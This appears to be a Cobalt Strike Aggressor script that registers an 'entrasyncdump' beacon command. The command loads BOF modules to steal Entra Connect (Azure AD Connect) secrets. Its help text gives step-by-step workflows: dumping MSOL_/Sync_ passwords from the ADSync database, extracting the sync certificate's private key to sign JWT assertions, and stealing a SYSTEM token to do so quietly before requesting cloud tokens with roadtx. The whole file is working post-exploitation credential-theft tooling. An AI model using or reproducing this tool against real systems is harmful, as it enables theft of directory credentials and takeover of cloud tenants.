beacon_command_register(
    "entrasyncdump",
    "Entra Connect (Azure AD Connect) certificate dumper",
    "Usage: entrasyncdump <command> [args...]\n\n"
    "Commands:\n"
    "  version       - Read installed Entra Connect version, SQL instance name, and auth type\n"
    "  dumpcertinfo  - Check for ABA/certificate auth, enumerate cert thumbprints,\n"
    "                  and extract the application/client ID\n"
    "  dumpcert      - Extract ADSync private key handle and build a signed JWT assertion\n"
    "                  (requires admin, does full process enumeration)\n"
    "  autodumpcert  - One-shot: discover thumbprint, impersonate via PID, sign JWT\n"
    "                  (requires SYSTEM, no process enumeration, no SQL)\n"
    "  dumpcreds     - Dump MSOL_/Sync_ password credentials from the ADSync database\n"
    "                  (requires local admin, for password-based auth installs)\n"
    "  help          - Show this help message\n\n"
    "Arguments:\n"
    "  dumpcertinfo [instancename]\n"
    "      Optional LocalDB instance name override\n"
    "  dumpcert <thumbprint> <client_id> <tenant_id>\n"
    "      Certificate thumbprint (40 hex chars), application/client ID, and tenant ID\n"
    "  autodumpcert <pid> <tenant_id> <client_id>\n"
    "      PID of miiserver.exe (from 'ps'), tenant ID, client ID (from dumpcertinfo)\n"
    "  dumpcreds [instancename]\n"
    "      Optional LocalDB instance name override\n\n"
    "Workflow (manual):\n"
    "  1. Run 'version' to check Entra Connect version and auth type\n"
    "  2. Run 'dumpcertinfo' to get the cert thumbprint and client ID\n"
    "  3. Run 'dumpcert <thumbprint> <client_id> <tenant_id>'\n"
    "  4. Use the assertion with roadtx or a direct token request\n\n"
    "Workflow (password-based / MSOL credentials):\n"
    "  1. Run 'version' to confirm password-based auth\n"
    "  2. Run 'dumpcreds' (as local admin)\n\n"
    "Workflow (quiet — requires SYSTEM via steal_token):\n"
    "  1. steal_token <system_pid>\n"
    "  2. Find miiserver.exe PID from 'ps'\n"
    "  3. Run 'autodumpcert <miiserver_pid> <tenant_id>'\n"
    "  4. rev2self\n"
);

alias entrasyncdump {
    local('$bid $cmd $arg1 $arg2 $arg3 $handle $data $args $bof_file');
    local('@_parts');
    $bid = $1;

    if (" " isin $2) {
        @_parts = split(" ", $2);
        $cmd   = @_parts[0];
        $arg1  = @_parts[1];
        $arg2  = @_parts[2];
        $arg3  = @_parts[3];
    } else {
        $cmd  = $2;
        $arg1 = $3;
        $arg2 = $4;
        $arg3 = $5;
    }

    if ($cmd eq "" || $cmd eq "help") {
        berror($bid, "Usage: entrasyncdump <version|dumpcertinfo|dumpcert|autodumpcert|help> [args...]");
        return;
    }

    # Map command to BOF file
    if ($cmd eq "version") {
        $bof_file = "entrasyncdump_version";
    } else if ($cmd eq "dumpcertinfo") {
        $bof_file = "entrasyncdump_dumpcertinfo";
    } else if ($cmd eq "dumpcert") {
        $bof_file = "entrasyncdump_dumpcert";
    } else if ($cmd eq "autodumpcert") {
        $bof_file = "entrasyncdump_autodumpcert";
    } else if ($cmd eq "dumpcreds") {
        $bof_file = "entrasyncdump_dumpcreds";
    } else {
        berror($bid, "Unknown command '" . $cmd . "'. Run 'entrasyncdump help' for usage.");
        return;
    }

    # Read the BOF
    $handle = openf(script_resource($bof_file . "." . barch($bid) . ".o"));
    $data = readb($handle, -1);
    closef($handle);

    # Pack arguments based on the command
    if ($cmd eq "dumpcert") {
        if ($arg1 eq "" || $arg2 eq "" || $arg3 eq "") {
            berror($bid, "Usage: entrasyncdump dumpcert <thumbprint> <client_id> <tenant_id>");
            return;
        }
        $args = bof_pack($bid, "zzz", $arg1, $arg2, $arg3);
        btask($bid, "Tasked beacon to run entrasyncdump dumpcert");

    } else if ($cmd eq "dumpcertinfo") {
        if ($arg1 ne "") {
            $args = bof_pack($bid, "z", $arg1);
        } else {
            $args = bof_pack($bid, "");
        }
        btask($bid, "Tasked beacon to run entrasyncdump dumpcertinfo");

    } else if ($cmd eq "autodumpcert") {
        if ($arg1 eq "" || $arg2 eq "" || $arg3 eq "") {
            berror($bid, "Usage: entrasyncdump autodumpcert <pid> <tenant_id> <client_id>");
            return;
        }
        $args = bof_pack($bid, "izz", int($arg1), $arg2, $arg3);
        btask($bid, "Tasked beacon to run entrasyncdump autodumpcert (PID: " . $arg1 . ")");

    } else if ($cmd eq "dumpcreds") {
        if ($arg1 ne "") {
            $args = bof_pack($bid, "z", $arg1);
        } else {
            $args = bof_pack($bid, "");
        }
        btask($bid, "Tasked beacon to run entrasyncdump dumpcreds");

    } else {
        # version — no args
        $args = bof_pack($bid, "");
        btask($bid, "Tasked beacon to run entrasyncdump version");
    }

    beacon_inline_execute($bid, $data, "go", $args);
}
